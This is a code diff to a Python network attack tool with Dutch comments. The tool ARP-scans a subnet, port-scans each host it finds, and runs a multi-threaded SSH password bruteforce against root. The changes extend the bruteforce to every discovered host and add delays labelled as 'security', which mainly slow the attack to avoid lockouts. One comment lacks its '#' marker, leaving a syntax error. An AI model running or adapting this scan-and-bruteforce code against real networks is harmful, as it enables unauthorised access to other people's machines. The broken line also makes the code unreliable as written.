@@ -3,14 +3,20 @@ import socket
 import base64
 import json
 import logging
-from typing import Dict, List, Union
+from typing import Dict, List, Union, Any
 from concurrent.futures import ThreadPoolExecutor
 from pathlib import Path
 import platform
 import asyncio
+import time  # Nieuw voor rate limiting
 
 from scapy.all import ARP, Ether, srp, get_working_ifaces
 import paramiko
+
+# Veiligheidsconfiguratie
+logging.getLogger("paramiko").setLevel(logging.WARNING)  # Minder verbose logging
+MAX_SCAN_PORTS = 15  Beperk aantal poorten
+MIN_RATE_LIMIT = 1.0  # Minimaal 1 seconde tussen pogingen
 
 # Configureer logging
 logging.basicConfig(
@@ -69,11 +75,11 @@ def arp_scan(target_ip: str = "192.168.1.0/24") -> List[Dict[str, str]]:
         ether_layer = Ether(dst="ff:ff:ff:ff:ff:ff")
         packet = ether_layer/arp_layer
 
-        # Uitvoeren scan
+        # Uitvoeren scan met langere timeout
         result, _ = srp(
             packet,
             iface=iface.name,
-            timeout=2,
+            timeout=5,  # Verhoogde timeout
             verbose=0,
             inter=0.1,
             threaded=True
@@ -86,10 +92,7 @@ def arp_scan(target_ip: str = "192.168.1.0/24") -> List[Dict[str, str]]:
         } for sent, received in result]
 
         if not devices:
-            logging.warning("Geen apparaten gevonden - controleer:")
-            logging.warning("- Interface/IP combinatie")
-            logging.warning("- Firewall instellingen")
-            logging.warning("- Netwerkverbinding")
+            logging.warning("Geen apparaten gevonden - controleer netwerkinstellingen")
 
         return devices
 
@@ -97,9 +100,13 @@ def arp_scan(target_ip: str = "192.168.1.0/24") -> List[Dict[str, str]]:
         logging.critical(f"ARP-scan fout: {str(e)}")
         return []
 
-async def async_port_scan(host: str, ports: List[int] = [21, 22, 80, 443, 3389]) -> Dict[int, str]:
+async def async_port_scan(host: str, ports: List[int] = None) -> Dict[int, str]:
     """Asynchrone portscanner met service detectie"""
     logging.info(f"Portscan gestart voor {host}")
+    
+    # Standaard poortenlijst met beperking
+    default_ports = [21, 22, 23, 80, 443, 8080, 3389, 5900]
+    ports = ports[:MAX_SCAN_PORTS] if ports else default_ports
     
     open_ports = {}
     loop = asyncio.get_event_loop()
@@ -131,8 +138,8 @@ async def async_port_scan(host: str, ports: List[int] = [21, 22, 80, 443, 3389])
 
     return open_ports
 
-def ssh_bruteforce(host: str, port: int = 22, username: str = "root", max_workers: int = 5) -> bool:
-    """Multi-threaded SSH bruteforce met waarschuwingen"""
+def ssh_bruteforce(host: str, port: int = 22, username: str = "root", max_workers: int = 3) -> bool:
+    """Beveiligde SSH bruteforce met rate limiting"""
     logging.warning(f"SSH bruteforce gestart op {host}:{port}")
     
     client = paramiko.SSHClient()
@@ -147,6 +154,7 @@ def ssh_bruteforce(host: str, port: int = 22, username: str = "root", max_worker
 
     def try_password(password: str) -> bool:
         try:
+            time.sleep(MIN_RATE_LIMIT)  # Rate limiting
             client.connect(
                 host,
                 port=port,
@@ -184,20 +192,30 @@ async def main():
         target += "/24"
         logging.info(f"Subnetmasker toegevoegd: {target}")
 
-    results = {'arp_scan': [], 'open_ports': {}, 'ssh_bruteforce': False}
+    results = {
+        'arp_scan': [],
+        'open_ports': {},
+        'ssh_bruteforce': {}
+    }
 
     # ARP Scan
     results['arp_scan'] = arp_scan(target)
     
     if results['arp_scan']:
-        first_ip = results['arp_scan'][0]['IP']
-        
-        # Port Scan
-        results['open_ports'] = await async_port_scan(first_ip)
-        
-        # SSH Bruteforce indien poort 22 open
-        if 22 in results['open_ports']:
-            results['ssh_bruteforce'] = ssh_bruteforce(first_ip)
+        # Scan alle gevonden IP's
+        for device in results['arp_scan']:
+            current_ip = device['IP']
+            try:
+                # Port Scan
+                results['open_ports'][current_ip] = await async_port_scan(current_ip)
+                
+                # SSH Bruteforce alleen bij open poort 22
+                if 22 in results['open_ports'][current_ip]:
+                    results['ssh_bruteforce'][current_ip] = ssh_bruteforce(current_ip)
+                else:
+                    results['ssh_bruteforce'][current_ip] = "Niet uitgevoerd (poort 22 gesloten)"
+            except Exception as e:
+                logging.error(f"Fout bij scan van {current_ip}: {str(e)}")
 
     # Opslaan resultaten
     save_results(results)
